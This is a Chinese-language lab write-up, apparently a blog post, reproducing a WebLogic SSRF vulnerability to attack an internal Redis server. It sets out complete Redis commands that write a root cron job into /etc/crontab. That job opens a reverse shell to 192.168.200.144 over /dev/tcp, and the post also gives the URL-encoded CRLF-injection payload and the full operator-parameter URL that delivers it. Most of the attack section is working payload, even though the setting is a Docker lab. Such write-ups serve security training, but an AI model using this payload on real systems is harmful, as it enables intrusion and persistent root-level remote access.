# 【漏洞复现】weblogic SSRF攻击内网redis反弹shell
- 实验环境在kali中docker镜像中进行
- Weblogic中存在一个SSRF漏洞，本实验将利用该漏洞可以发送HTTP请求攻击内网中redis组件
- SSRF就是利用服务端来替我们去发送请求

### 首先启动kali，去拉取docker镜像，然后进入本机7001端口如果发现404就说明weblogic安装成功
### 拉取镜像：
![image](https://github.com/hecker-zz/blog/assets/153266742/e9f776dd-90bb-4c47-8d1e-cb01af8adb71)

### 访问7001端口：
![image](https://github.com/hecker-zz/blog/assets/153266742/b4440265-23d7-4a6d-9127-49912b0714ef)

### 进入:7001/uddiexplorer/目录下点击SearchPublicRegistries，进入页面后随便点击一下search按钮后进入bp进行重放。
### 点击search按钮
![image](https://github.com/hecker-zz/blog/assets/153266742/d2507f0b-8b06-4fe8-9975-87c104e29737)

### 进入bp找到该流量然后ctrl+R发送到重放模块
![image](https://github.com/hecker-zz/blog/assets/153266742/299b63c1-09c4-4438-b266-30834c2dcd68)

### 进入后发现operator选项中好像可以给别的目标发送http请求
![image](https://github.com/hecker-zz/blog/assets/153266742/30885077-5dec-4ec2-91c7-aa097f127b13)
### 测试一下给自己发一个http请求，发现成功了，结果就是刚开始我们访问7001端口时的404
![image](https://github.com/hecker-zz/blog/assets/153266742/58592d67-ec18-4233-98d8-bba421df1177)

### 这样的话就可以对内网其他主机进行搜寻。发现有台主机开放了6379端口，也就是redis服务。

### 那就可以利用redis数据库把反弹shell写到系统的计划任务中去，让他每隔一分钟反弹一次
### 发送三条redis命令，将弹shell脚本写入/etc/crontab
```
set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/192.168.200.144/21 0>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```
### 因为是在url中传递的所以要进行url编码
```
set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.200.144%2F21%200%3E%261'%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave
```
### 那么开始构造传递的operator参数
```
http://172.19.0.2:6379/hecker%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.200.144%2F21%200%3E%261'%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Ahecker HTTP/1.1

```
### 把构造好的参数放到请求中去
![image](https://github.com/hecker-zz/blog/assets/153266742/57a8e86f-c046-497e-a2f9-29d7404c72a4)

### 在反弹之前本地监听21端口
![image](https://github.com/hecker-zz/blog/assets/153266742/5c834e44-f9b8-44ab-9132-d2ffeb485a5f)
### 然后发送请求后本地等待连接即可，这里发现已经反弹成功，成功拿到shell
![image](https://github.com/hecker-zz/blog/assets/153266742/b9c0614c-c205-480e-a455-775cfc224c44)